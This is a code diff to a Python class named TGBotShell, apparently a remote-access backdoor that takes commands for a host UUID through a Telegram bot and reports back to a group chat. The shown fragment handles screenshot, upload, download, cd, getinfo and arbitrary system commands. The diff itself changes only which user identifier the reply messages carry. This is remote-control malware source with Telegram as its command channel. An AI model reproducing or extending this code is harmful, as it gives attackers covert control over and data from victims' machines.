@@ -66,11 +66,9 @@ class TGBotShell:
                             if matches[0].replace(" ","") == str(self.UUID):
                                 shell_text = ' '.join(matches[1:]).lstrip(" ")
                                 updates.append({'chatid': item['message']['chat']['id'],
-                                                'username': [item['message']['from']['username']],
+                                                'username': [item['message']['from']['id']],
                                                 'text': shell_text})
                         self.offset = response['result'][-1]['update_id']
-                self.send_chat_msg({"chatid": self.GroupID, "username": self.UserID,
-                                    "text": f"主机：{self.UUID}\n2结果是{updates}！"})
                 return updates
             else:
                 return False
@@ -101,22 +99,22 @@ class TGBotShell:
             print(cmd_list)
             if cmd_list[0] == "screenshot":
                 self.send_chat_msg(
-                    {"chatid": self.GroupID, "username": self.UserID, "text": f"主机：{self.UUID}\n执行screenshot！"})
+                    {"chatid": self.GroupID, "username": item_user['username'], "text": f"主机：{self.UUID}\n执行screenshot！"})
             elif cmd_list[0] == "upload":
                 self.send_chat_msg(
-                    {"chatid": self.GroupID, "username": self.UserID, "text": f"主机：{self.UUID}\n执行upload！"})
+                    {"chatid": self.GroupID, "username": item_user['username'], "text": f"主机：{self.UUID}\n执行upload！"})
             elif cmd_list[0] == "download":
                 self.send_chat_msg(
-                    {"chatid": self.GroupID, "username": self.UserID, "text": f"主机：{self.UUID}\n执行download！"})
+                    {"chatid": self.GroupID, "username": item_user['username'], "text": f"主机：{self.UUID}\n执行download！"})
             elif cmd_list[0] == "cd":
                 self.send_chat_msg(
-                    {"chatid": self.GroupID, "username": self.UserID, "text": f"主机：{self.UUID}\n执行cd！"})
+                    {"chatid": self.GroupID, "username": item_user['username'], "text": f"主机：{self.UUID}\n执行cd！"})
             elif cmd_list[0] == "getinfo":
                 self.send_chat_msg(
-                    {"chatid": self.GroupID, "username": self.UserID, "text": f"主机：{self.UUID}\n执行getinfo！"})
+                    {"chatid": self.GroupID, "username": item_user['username'], "text": f"主机：{self.UUID}\n执行getinfo！"})
             else:
                 self.send_chat_msg(
-                    {"chatid": self.GroupID, "username": self.UserID, "text": f"主机：{self.UUID}\n执行系统命令！"})
+                    {"chatid": self.GroupID, "username": item_user['username'], "text": f"主机：{self.UUID}\n执行系统命令！"})
 
     def main(self):
         self.UUID = uuid.uuid4()
